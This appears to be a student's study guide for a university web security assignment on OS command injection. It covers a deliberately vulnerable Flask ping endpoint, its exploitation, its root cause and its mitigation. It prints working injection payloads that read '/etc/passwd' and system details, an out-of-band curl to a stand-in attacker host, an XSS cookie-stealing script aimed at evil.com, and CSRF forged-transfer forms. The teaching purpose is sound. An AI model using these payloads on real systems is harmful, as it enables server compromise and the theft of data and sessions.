# OS Command Injection — Complete Assignment Breakdown

> **Indian Institute of Information Technology Allahabad (IIITA)**  
> **Department of Information Technology**  
> **Course:** Cyber Security (IT-30001) | Autumn Semester 2026  
> **Instructor:** Dr. Soumyadev Maity  
> **Assignment:** Web Server Security — Exploitation and Mitigation  
> **Deadline:** 03 November 2026, 23:59 IST  
> **Your Assigned Category:** OS Command Injection  
> **Your Chosen Variant:** Variant 1 — In-Band (Command output returned)

---

## Table of Contents

1. [What Is This Assignment About?](#1-what-is-this-assignment-about)
2. [What Exactly Is OS Command Injection?](#2-what-exactly-is-os-command-injection)
3. [In-Band vs Blind — The Two Variants](#3-in-band-vs-blind--the-two-variants)
4. [Your Specific Task Checklist (Table 2 Items a–e)](#4-your-specific-task-checklist-table-2-items-ae)
5. [The Vulnerable Application — What I Built and Why It Is Flawed](#5-the-vulnerable-application--what-i-built-and-why-it-is-flawed)
6. [The Exploit — How It Works Step by Step](#6-the-exploit--how-it-works-step-by-step)
7. [Root Cause Analysis — Why This Vulnerability Exists](#7-root-cause-analysis--why-this-vulnerability-exists)
8. [The Mitigation I Implemented — How It Stops the Attack](#8-the-mitigation-i-implemented--how-it-stops-the-attack)
9. [Other Mitigations from the Lecture Slides (Theory)](#9-other-mitigations-from-the-lecture-slides-theory)
10. [All Four Vulnerability Categories in the Assignment (Overview)](#10-all-four-vulnerability-categories-in-the-assignment-overview)
11. [Deliverables Checklist — What You Must Submit](#11-deliverables-checklist--what-you-must-submit)
12. [How to Run, Record, and Submit](#12-how-to-run-record-and-submit)
13. [Viva Preparation — Likely Questions and Answers](#13-viva-preparation--likely-questions-and-answers)

---

## 1. What Is This Assignment About?

The assignment asks your group to **demonstrate the full lifecycle of a web security vulnerability**:

```
Vulnerable Code  →  Exploit It  →  Understand Why  →  Fix It  →  Explain Alternatives
```

Your group of up to 4 members must cover **four vulnerability categories**. Each member takes **one category** and implements **one variant** of it. The four categories are:

| # | Category | Variant 1 | Variant 2 |
|---|----------|-----------|-----------|
| 1 | SQL Injection | Authentication bypass | UNION-based data extraction |
| 2 | **OS Command Injection** | **In-band (output returned)** ✅ Your task | Blind (time-based / out-of-band) |
| 3 | Cross-Site Scripting (XSS) | Stored XSS | Reflected XSS |
| 4 | Cross-Site Request Forgery (CSRF) | GET-based forged action | POST-based forged action |

**You are responsible for OS Command Injection, Variant 1 (In-Band).**

The key rules:
- **Individual ownership** — you personally implement your variant; no one else in the group does the same variant
- **You implement one mitigation** of your choice and actually code it
- **You study the other mitigations** from the lecture slides and explain them in theory
- **You must be able to demo it live** and answer questions at the viva

---

## 2. What Exactly Is OS Command Injection?

### The Concept

OS Command Injection is a vulnerability where an attacker can **execute arbitrary operating system commands** on the server that hosts a web application. It happens when:

1. The application takes **user input** (from a form, URL parameter, API request, etc.)
2. That input is **inserted into an operating system command** (like `ping`, `nslookup`, `traceroute`, `ls`, etc.)
3. The command is **executed via a system shell** (like `/bin/sh` on Linux or `cmd.exe` on Windows)
4. The shell **interprets special characters** in the user input as command separators

### A Real-World Analogy

Imagine a receptionist at a company who takes your name and types it into a form. You are supposed to say "John Smith", and she types:

```
Print badge for John Smith
```

But instead, you say: `John Smith. Also, open the vault.`

And the receptionist, without thinking, types:

```
Print badge for John Smith. Also, open the vault.
```

The system executes both instructions. The receptionist (the shell) didn't distinguish between "data" (your name) and "instructions" (open the vault). This is the fundamental confusion that causes injection vulnerabilities.

### In Computing Terms

A web app has a "Network Diagnostic" tool. It takes a hostname from the user and runs:

```bash
ping -c 2 <user_input>
```

If the user enters `google.com`, the server runs:
```bash
ping -c 2 google.com       # ← Harmless
```

If the user enters `google.com; cat /etc/passwd`, the server runs:
```bash
ping -c 2 google.com; cat /etc/passwd    # ← TWO commands executed!
```

The semicolon (`;`) tells the shell: "the first command is done, now run this second one." The attacker just read a sensitive system file.

### Why Is This Dangerous?

OS Command Injection is one of the most severe web vulnerabilities because the attacker gains **direct access to the operating system**. They can:

- **Read any file** the web server user can access (`/etc/passwd`, configuration files, database credentials)
- **Execute any program** (`wget` to download malware, `curl` to exfiltrate data)
- **Modify or delete files** (deface the website, destroy data)
- **Establish persistence** (create new user accounts, install backdoors, start reverse shells)
- **Pivot to other systems** on the internal network

It is ranked in the **OWASP Top 10** under **A03:2021 — Injection**.

---

## 3. In-Band vs Blind — The Two Variants

The assignment offers two variants. You chose **Variant 1: In-Band**.

### Variant 1: In-Band (Command Output Returned) ← YOUR VARIANT

The injected command's **stdout and stderr are captured by the application and sent back** in the HTTP response. The attacker sees the result directly in the browser or API response.

```
Attacker sends:    127.0.0.1; whoami
Server runs:       ping -c 2 127.0.0.1; whoami
Server captures:   [ping output] + "varun"
HTTP response:     { "output": "...ping stats...\nvarun\n" }
                                                    ↑
                                    Attacker sees this immediately
```

**Advantages for the attacker:** Immediate feedback. Easy to enumerate the system.  
**Advantages for demonstration:** Very visual, very clear in a video.

### Variant 2: Blind (Time-Based or Out-of-Band)

The application does **not return command output** in the response. The attacker must infer whether injection succeeded through **side-channels**:

- **Time-based:** Inject `; sleep 5`. If the HTTP response takes 5 seconds longer than usual, the command executed.
- **Out-of-band:** Inject `; curl http://attacker-server.com/$(whoami)`. The attacker checks their own server's access logs to see if a request arrived with the system username.

**Why In-Band is better for this assignment:** It is more visual, easier to demonstrate in a 2–3 minute video, and produces clear evidence (you can show the command output right in the browser).

---

## 4. Your Specific Task Checklist (Table 2 Items a–e)

The assignment specifies exactly five things you must show. Here is each one and what you have:

### ✅ (a) Vulnerable Implementation — The Code Path with the Flaw

**What is required:** Show the exact code that contains the security flaw, clearly identified.

**What you have:** In `app.py`, lines 36–54, the vulnerable endpoint:
```python
command = f"ping -c 2 {target}"          # User input concatenated directly
process = subprocess.run(
    command,
    shell=True,                          # Invokes /bin/sh -c → THE FLAW
    capture_output=True,                 # Captures stdout+stderr
    text=True, timeout=6
)
output = process.stdout + process.stderr # Returned to user (in-band)
```

**Two things make it vulnerable:**
1. `f"ping -c 2 {target}"` — unsanitized string concatenation
2. `shell=True` — the string is passed to the system shell for parsing

---

### ✅ (b) Working Exploit — The Exact Payload, Shown Running

**What is required:** Show the exact payload or HTTP request used, running live in the video.

**What you have:** Multiple tested payloads:

| Payload | What It Does |
|:--------|:-------------|
| `127.0.0.1; whoami` | Returns the current OS username |
| `127.0.0.1; id; uname -a` | Returns user/group IDs and full kernel info |
| `127.0.0.1; cat /etc/passwd \| head -5` | Dumps the first 5 lines of the system password file |
| `127.0.0.1 && ps aux \| head -6` | Lists running processes |

The primary demonstration payload is:
```
127.0.0.1; whoami; id; uname -a
```

When submitted in Vulnerable mode, the HTTP response contains:
```
PING 127.0.0.1 ...
2 packets transmitted, 2 received, 0% packet loss ...
varun                                              ← injected: whoami
uid=1000(varun) gid=982(users) ...                 ← injected: id
Linux archlinux 6.12.1-arch1-1 ... x86_64 GNU/Linux  ← injected: uname -a
```

---

### ✅ (c) Root Cause — Why It Works (One or Two Lines)

**What is required:** One or two lines explaining why the vulnerability exists.

**Your answer:**

> User input is concatenated directly into a shell command string and executed with `subprocess.run(shell=True)`. The system shell (`/bin/sh`) interprets metacharacters like `;`, `&&`, and `|` in the user input as command separators, executing arbitrary attacker-supplied commands whose output is returned in the HTTP response.

---

### ✅ (d) Mitigation Implemented — One Fix, Same Payload Now Fails

**What is required:** Implement one fix of your choice. Show the same exploit payload now being blocked.

**What you have:** A two-layer defense:

**Layer 1 — Allow-list regex validation:**
```python
allowlist_regex = r"^[a-zA-Z0-9.-]+$"
if not re.match(allowlist_regex, target):
    return jsonify({"status": "blocked", ...}), 400
```
This rejects any input containing `;`, spaces, `&`, `|`, backticks, `$`, or any other character that isn't alphanumeric, a dot, or a hyphen.

**Layer 2 — Parameterized execution (shell=False):**
```python
cmd_args = ["ping", "-c", "2", target]
process = subprocess.run(cmd_args, shell=False, ...)
```
Even if Layer 1 were somehow bypassed, `shell=False` means the OS kernel receives the arguments as a discrete vector via `execve()` — no shell interpreter is involved, so metacharacters are treated as literal text.

**Proof it works:** Submitting `127.0.0.1; whoami; id; uname -a` in Mitigated mode returns:
```json
{
  "status": "blocked",
  "message": "SECURITY ALERT: Request blocked by allow-list filter."
}
```
HTTP 400. Zero commands executed. Attack neutralized.

---

### ✅ (e) Other Mitigations — Theory from the Lecture Slides

**What is required:** A short paragraph summarising the other mitigation options and why they work.

The lecture slides list four defenses for command injection:

1. **Avoid the shell** — Use native language APIs (e.g., Python `socket`, `ping3`) instead of spawning OS commands. If no shell or subprocess is ever invoked, injection is architecturally impossible.

2. **Parameterized execution with an argument vector** — Pass the command and arguments as a list (`["ping", "-c", "2", target]`) with `shell=False`. The OS `execve` syscall receives them as discrete `argv` entries; metacharacters are never parsed as syntax.

3. **Allow-list validation** — Validate input against a strict whitelist regex (e.g., `^[a-zA-Z0-9.-]+$`). This rejects dangerous characters at the application boundary before any execution logic.

4. **Least privilege** — Run the web server under a restricted user (`www-data`) in a container, chroot, or AppArmor/seccomp sandbox. Even if injection succeeds, the attacker cannot escalate privileges, read sensitive files, or pivot to other systems.

My implementation uses strategies 2 and 3. Strategies 1 and 4 are explained as theory.

---

## 5. The Vulnerable Application — What I Built and Why It Is Flawed

### The Scenario

I built a **Network Host Diagnostic Tool** — a simple web application where a user enters a hostname or IP address, and the server runs `ping` against it and returns the result.

This is a realistic scenario. Many network monitoring dashboards, router admin panels, and IT management tools provide exactly this kind of functionality. Real-world CVEs have been found in routers, NAS devices, and web applications that have this exact vulnerability.

### The Architecture

```
┌─────────────────────┐         POST /api/ping           ┌──────────────────────┐
│    Browser (User)    │  ───── {"target": "..."} ──────► │   Flask Web Server   │
│                      │                                  │                      │
│  Enters hostname     │         JSON Response            │  subprocess.run(     │
│  in a form field     │  ◄── {"output": "..."} ────────  │    "ping -c 2 ...",  │
│                      │                                  │    shell=True        │
│  Sees the ping       │                                  │  )                   │
│  output (in-band)    │                                  │                      │
└─────────────────────┘                                  └──────────────────────┘
```

### The Technology Stack

| Component | Technology | Why |
|:----------|:-----------|:----|
| Backend | Python 3.12 + Flask | Simple, widely taught, clear code |
| Vulnerable function | `subprocess.run(cmd, shell=True)` | The standard way command injection happens in Python |
| Frontend | Single HTML page with vanilla JavaScript | No framework overhead; everything visible in one file |
| OS command | `ping -c 2 <target>` | Realistic network diagnostic tool |

### The File Structure

```
os-command-injection-assignment/
├── app.py                  ← Flask server (vulnerable + mitigated endpoints)
├── templates/
│   └── index.html          ← Interactive web dashboard
├── test_exploit.py         ← Automated verification (4 tests)
├── requirements.txt        ← Dependencies (just Flask)
├── run.sh                  ← One-command launcher
├── README.md               ← Full documentation + Table 3 ownership
├── VIDEO_SCRIPT.md         ← Word-for-word narration for the video
├── WALKTHROUGH.md          ← Step-by-step commands with expected outputs
└── ASSIGNMENT_EXPLAINED.md ← This file
```

---

## 6. The Exploit — How It Works Step by Step

Let's trace exactly what happens when the exploit payload `127.0.0.1; whoami; id` is submitted:

### Step 1: User Submits the Payload

The browser sends an HTTP POST request:
```http
POST /api/ping HTTP/1.1
Content-Type: application/json

{"target": "127.0.0.1; whoami; id", "mode": "vulnerable"}
```

### Step 2: Flask Receives the Input

```python
target = data.get("target", "").strip()
# target is now the string: "127.0.0.1; whoami; id"
```

No validation, no sanitization, no type checking. The raw string is accepted as-is.

### Step 3: String Concatenation Builds the Command

```python
command = f"ping -c 2 {target}"
# command is now: "ping -c 2 127.0.0.1; whoami; id"
```

The user input has been embedded directly into a shell command string.

### Step 4: Shell Execution via `subprocess.run`

```python
process = subprocess.run(command, shell=True, capture_output=True, text=True)
```

Because `shell=True`, Python does this internally:
```python
# Equivalent to:
os.execvp("/bin/sh", ["/bin/sh", "-c", "ping -c 2 127.0.0.1; whoami; id"])
```

### Step 5: The Shell Parses the String

The system shell (`/bin/sh`) receives: `ping -c 2 127.0.0.1; whoami; id`

The shell's parser recognizes `;` as a **command separator** (exactly like pressing Enter between commands). It interprets this as **three separate commands**:

```
Command 1:  ping -c 2 127.0.0.1
Command 2:  whoami
Command 3:  id
```

### Step 6: All Three Commands Execute Sequentially

```bash
$ ping -c 2 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.064 ms
--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss

$ whoami
varun

$ id
uid=1000(varun) gid=982(users) groups=982(users),959(docker)
```

### Step 7: Output Returned In-Band

```python
output = process.stdout + process.stderr
return jsonify({"output": output})
```

All the combined output — including the injected commands — is sent back in the HTTP response. The attacker sees everything in their browser.

### Shell Metacharacters an Attacker Can Use

| Character | Shell Meaning | Example Payload |
|:----------|:-------------|:----------------|
| `;` | Sequential execution (run next command after) | `127.0.0.1; whoami` |
| `&&` | Conditional AND (run next if previous succeeds) | `127.0.0.1 && id` |
| `\|\|` | Conditional OR (run next if previous fails) | `invalidhost \|\| whoami` |
| `\|` | Pipe (feed output to next command) | `127.0.0.1 \| whoami` |
| `` ` `` | Command substitution (backticks) | `` 127.0.0.1`whoami` `` |
| `$()` | Command substitution (modern syntax) | `$(whoami).127.0.0.1` |
| `>` | Output redirection (write to file) | `127.0.0.1; echo hacked > /tmp/proof` |
| `\n` | Newline (URL-encoded as `%0a`) | `127.0.0.1%0awhoami` |

---

## 7. Root Cause Analysis — Why This Vulnerability Exists

The root cause is a **failure to separate code from data**.

### The Fundamental Problem

In a secure system, there is a clear boundary between:
- **Instructions** (the program's logic — what to execute)
- **Data** (the user's input — what to operate on)

In the vulnerable code, this boundary does not exist:

```python
command = f"ping -c 2 {target}"   # Data (target) is mixed into instructions (command)
subprocess.run(command, shell=True)  # The shell cannot tell them apart
```

The variable `target` is supposed to be **data** (a hostname). But when embedded in a shell command string and passed to `/bin/sh`, the shell has no way to know which part is "the programmer's intended command" and which part is "the user's data." It parses the entire string using the same grammar rules, treating `;` in user input the same as `;` in programmer-written code.

### Three Contributing Factors

| Factor | Description |
|:-------|:------------|
| **1. No input validation** | The application accepts any string from the user without checking its format, length, or character set |
| **2. String concatenation into a command** | User input is inserted directly into a command string via f-string interpolation, creating a classic injection point |
| **3. Shell interpreter invocation (`shell=True`)** | The command is dispatched to the system shell, which is a full programming language interpreter capable of executing arbitrary code |

### This Is the Same Class of Bug as SQL Injection

SQL injection works the same way: user input is concatenated into a SQL query string, and the database engine's parser cannot distinguish programmer-intended SQL from attacker-injected SQL. The fix is also analogous: use **parameterized queries** (prepared statements) to maintain the boundary between code and data.

---

## 8. The Mitigation I Implemented — How It Stops the Attack

### Defense-in-Depth: Two Layers

I implemented two independent security controls. Either one alone would stop the demonstrated attack, but using both provides **defense-in-depth** — if one layer has a bypass, the other still protects.

### Layer 1: Strict Allow-List Input Validation

```python
import re

allowlist_regex = r"^[a-zA-Z0-9.-]+$"
if not re.match(allowlist_regex, target):
    return jsonify({"status": "blocked", ...}), 400
```

**How it works:**
- The regex `^[a-zA-Z0-9.-]+$` means: "the entire string, from start (`^`) to end (`$`), must consist only of letters, digits, dots, and hyphens."
- Any character outside this set — including `;`, space, `&`, `|`, `` ` ``, `$`, `(`, `)`, `>`, `<`, newline — causes immediate rejection with HTTP 400.
- The payload `127.0.0.1; whoami` contains `;` and space, so it is rejected before any execution happens.

**Why allow-list (whitelist) instead of deny-list (blacklist)?**
- A deny-list tries to block known-bad characters (e.g., block `;` and `&`).
- Problem: attackers can use alternative characters the deny-list forgot: `${IFS}` (shell field separator replaces spaces), `%0a` (newline), backticks, `$()`, etc.
- An allow-list only permits known-good characters. Anything unexpected is blocked by default. This is fundamentally more secure.

### Layer 2: Parameterized Execution (`shell=False`)

```python
cmd_args = ["ping", "-c", "2", target]
process = subprocess.run(cmd_args, shell=False, capture_output=True, text=True)
```

**How it works:**
- Instead of a single string, the command is passed as a **list of strings** (an argument vector).
- With `shell=False`, Python does NOT invoke `/bin/sh`. Instead, it calls the OS kernel's `execve()` system call directly.
- `execve()` receives: binary = `/usr/bin/ping`, argv = `["ping", "-c", "2", "127.0.0.1; whoami"]`
- The `ping` program receives `127.0.0.1; whoami` as its **fourth argument** — a single, literal string.
- `ping` tries to resolve `127.0.0.1; whoami` as a hostname, fails, and reports "unknown host." No injection occurs.

**The key insight:** There is no shell interpreter to parse metacharacters. The `;` is just a regular character in a string, like any letter.

### How Both Layers Work Together

```
User Input: "127.0.0.1; whoami; id"
        │
        ▼
┌─── Layer 1: Regex ───┐
│ Match ^[a-zA-Z0-9.-]+$│
│ Contains ';' and ' '  │
│ Result: REJECTED ✗    │──────► HTTP 400 "BLOCKED"
└───────────────────────┘       (No execution at all)

If Layer 1 somehow bypassed:
        │
        ▼
┌─── Layer 2: shell=False ──┐
│ ["ping","-c","2","input"] │
│ execve() → no shell       │
│ ping gets literal string  │──► ping: "127.0.0.1; whoami": Name or service not known
│ No metachar parsing       │    (Injection neutralized)
└───────────────────────────┘
```

---

## 9. Other Mitigations from the Lecture Slides (Theory)

The course slides describe four mitigation strategies. My implementation covers strategies 2 and 3. Here is a comprehensive explanation of all four:

### Strategy 1: Avoid the Shell Entirely (Use Native APIs)

**The Idea:** Don't call external OS commands at all. Instead of running `ping` via `subprocess`, use a Python library that implements ICMP ping natively.

**Example:**
```python
# Instead of subprocess + ping:
import ping3
result = ping3.ping("127.0.0.1", timeout=2)
```

**Why It Works:** If no external process is ever spawned, and no shell is ever invoked, then there is nothing to inject into. The attack surface is completely eliminated. This is the most secure approach but not always practical — some operations have no native library equivalent.

### Strategy 2: Parameterized Execution with Argument Vector *(Implemented)*

**The Idea:** Pass the command as a list, not a string. Use `shell=False`.

**Why It Works:** Arguments go directly to the OS kernel via `execve()`. No shell parsing occurs. Metacharacters are treated as literal data.

### Strategy 3: Allow-List Input Validation *(Implemented)*

**The Idea:** Validate all user input against a strict pattern of known-good characters before processing.

**Why It Works:** Dangerous characters are rejected at the application boundary before they can reach any execution logic. Even if the execution method has a flaw, the input never contains the characters needed to exploit it.

### Strategy 4: Principle of Least Privilege and Sandboxing

**The Idea:** Run the web application with the minimum permissions needed. Use a dedicated unprivileged user account, a container, a chroot jail, or mandatory access controls (AppArmor, SELinux, seccomp).

**Examples:**
- Run the web server as `www-data` instead of `root`
- Use a Docker container with `--read-only` filesystem and no network tools installed
- Apply an AppArmor profile that only allows the specific binaries the app needs
- Use `seccomp` to restrict which system calls the process can make

**Why It Works:** Defense-in-depth. Even if an attacker achieves command execution through an unforeseen bypass, their capabilities are severely limited:
- Cannot read `/etc/shadow` or other root-owned files
- Cannot install packages or download tools
- Cannot modify system configurations
- Cannot pivot to other machines on the network
- Cannot escalate to root privileges

---

## 10. All Four Vulnerability Categories in the Assignment (Overview)

While your responsibility is only OS Command Injection, understanding all four helps at the viva if Dr. Maity asks cross-category questions.

### Category 1: SQL Injection

**What it is:** Attacker inserts SQL syntax into user input that gets concatenated into a database query.

**Example:**
```python
# Vulnerable:
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# Payload: username = ' OR 1=1 --
# Resulting query: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'
# The OR 1=1 is always true; the -- comments out the rest. Authentication bypassed.
```

**Mitigations:** Parameterized queries (prepared statements), input validation with allow-lists, least-privilege database accounts, safe error messages (don't leak schema info).

### Category 2: OS Command Injection ← YOUR CATEGORY

(Covered in full detail in sections 2–9 above)

### Category 3: Cross-Site Scripting (XSS)

**What it is:** Attacker injects JavaScript code that gets rendered in another user's browser.

**Example:**
```html
<!-- Stored XSS: attacker posts a comment containing: -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- The server stores it in the database and renders it on the page -->
<!-- Every user who views the page executes the attacker's JavaScript -->
```

**Mitigations:** Context-aware output encoding (HTML-encode `<` as `&lt;`), framework auto-escaping (Jinja2, React), HTML sanitizer libraries for rich text, Content Security Policy (CSP) headers, HttpOnly cookies (prevent JavaScript access), safe DOM APIs (`textContent` instead of `innerHTML`).

### Category 4: Cross-Site Request Forgery (CSRF)

**What it is:** Attacker tricks an authenticated user's browser into making an unintended request to a web application where the user is logged in.

**Example:**
```html
<!-- Attacker hosts this on evil.com -->
<!-- If the victim is logged into bank.com, their browser sends the cookie automatically -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- POST-based variant: auto-submitting form -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('f').submit();</script>
```

**Mitigations:** Anti-CSRF (synchronizer) tokens (server generates a random token per session/form, attacker can't guess it), SameSite cookie attribute (`SameSite=Strict` or `Lax` prevents cookies from being sent on cross-site requests), re-authentication for sensitive actions (require password before transfer), avoid state-changing GET requests (GET should be idempotent).

---

## 11. Deliverables Checklist — What You Must Submit

| # | Deliverable | Status | Location |
|:--|:------------|:------:|:---------|
| 1 | Source code in a **public GitHub repository** | ✅ Ready to push | `/home/varun/os-command-injection-assignment/` |
| 2 | **Group video** (screen recording + voice-over, ~2.5 min per member) | 📹 Record using the VIDEO_SCRIPT.md | `VIDEO_SCRIPT.md` has the narration |
| 3 | **Ownership declaration** (Table 3) in the README | ✅ Done | `README.md` — update names/roll numbers |
| 4 | **Readiness for viva** — demo live + answer questions | 📖 Study this document + WALKTHROUGH.md | Sections 6, 7, 8, 9, 13 of this file |

### What to submit and where:
1. **GitHub repo link** — share on the course page as instructed
2. **Video file or unlisted YouTube/Drive link** — submit as instructed on the course page

---

## 12. How to Run, Record, and Submit

### Step 1: Run the App Locally

```bash
cd /home/varun/os-command-injection-assignment
./run.sh
```

Open **http://127.0.0.1:5000** in your browser.

### Step 2: Run Automated Tests (Optional Verification)

```bash
./run.sh test
```

All 4 tests should pass.

### Step 3: Record the Video

Follow the script in `VIDEO_SCRIPT.md`. Record with one of:

```bash
# Option A: wf-recorder (Wayland/Hyprland native)
wf-recorder --audio -f demo_command_injection.mp4
# Do your demo, then Ctrl+C to stop

# Option B: OBS Studio
sudo pacman -S obs-studio
# Add Screen Capture + Audio Capture, hit Record

# Option C: Browser-based (no install)
# Go to https://screenapp.io or https://loom.com
```

### Step 4: Push to GitHub

```bash
cd /home/varun/os-command-injection-assignment

# First update README.md with your real name, roll number, and group members
# Then:
git add -A && git commit -m "final: update ownership table"
git remote add origin git@github.com:<your-username>/<repo-name>.git
git push -u origin main
```

### Step 5: Submit

Share the GitHub link and video on the course page before **03 November 2026, 23:59 IST**.

---

## 13. Viva Preparation — Likely Questions and Answers

### Conceptual Questions

**Q1: What is OS Command Injection?**  
A: It is a vulnerability where an attacker can execute arbitrary operating system commands on the server by injecting shell metacharacters into user input that is concatenated into a system command.

**Q2: What is the difference between In-Band and Blind command injection?**  
A: In In-Band injection, the command output is returned in the HTTP response — the attacker sees results directly. In Blind injection, output is not returned; the attacker infers success using time delays (e.g., `sleep 5`) or out-of-band callbacks (e.g., DNS/HTTP requests to their own server).

**Q3: What is the root cause of your vulnerability?**  
A: Untrusted user input is concatenated into a shell command string via f-string interpolation and executed with `shell=True`. The shell interprets metacharacters like `;` as command separators, executing attacker-supplied commands.

### Technical Questions

**Q4: Why is `shell=True` dangerous?**  
A: It passes the command string to `/bin/sh -c`, invoking a full shell interpreter. The shell parses metacharacters (`;`, `&&`, `|`, `` ` ``, `$()`) as syntax, allowing injection. With `shell=False`, Python calls `execve()` directly — no shell, no parsing, no injection.

**Q5: Why is a whitelist better than a blacklist?**  
A: Blacklists are inherently incomplete — there are many metacharacters and encoding tricks an attacker can use to bypass a blocklist (`${IFS}`, `%0a`, `$()`, backticks, etc.). A whitelist permits only known-good characters; everything else is rejected by default.

**Q6: Would `shell=False` alone (without the regex) stop this attack?**  
A: Yes. With `shell=False`, `["ping", "-c", "2", "127.0.0.1; whoami"]` passes the entire `"127.0.0.1; whoami"` as a single literal argument to `ping`. `ping` treats it as a hostname, fails to resolve it, and reports "unknown host." No shell is invoked, so no metacharacter parsing occurs.

**Q7: Would the regex alone (without `shell=False`) stop this attack?**  
A: Yes, for this specific attack. The regex `^[a-zA-Z0-9.-]+$` rejects `;` and spaces. However, relying solely on regex is riskier because regex patterns can have subtle bugs or edge cases. Using both is defense-in-depth.

**Q8: What is defense-in-depth?**  
A: A security strategy of layering multiple independent controls so that if one fails or is bypassed, others still protect the system. In my implementation: Layer 1 (regex) validates input, Layer 2 (`shell=False`) prevents shell interpretation.

**Q9: What is the `execve` system call?**  
A: `execve()` is a POSIX kernel system call that replaces the current process with a new program. It takes a binary path and an argument vector (`argv[]`). Unlike shell execution, it does not interpret metacharacters — each element in the argument vector is passed as a separate, literal string to the program.

### Cross-Category Questions

**Q10: How is command injection similar to SQL injection?**  
A: Both are injection vulnerabilities caused by concatenating untrusted user input into a string that is then interpreted by a parser (shell for command injection, SQL engine for SQL injection). Both are fixed by parameterization — keeping data separate from instructions.

**Q11: Could XSS be used together with command injection?**  
A: Yes, in a chained attack. If the diagnostic tool has a stored XSS vulnerability, an attacker could inject JavaScript that automatically submits the command injection payload whenever an admin views the page — combining client-side and server-side attacks.

**Q12: Name the OWASP Top 10 category for command injection.**  
A: **A03:2021 — Injection.** This category covers SQL injection, OS command injection, LDAP injection, and other injection flaws.
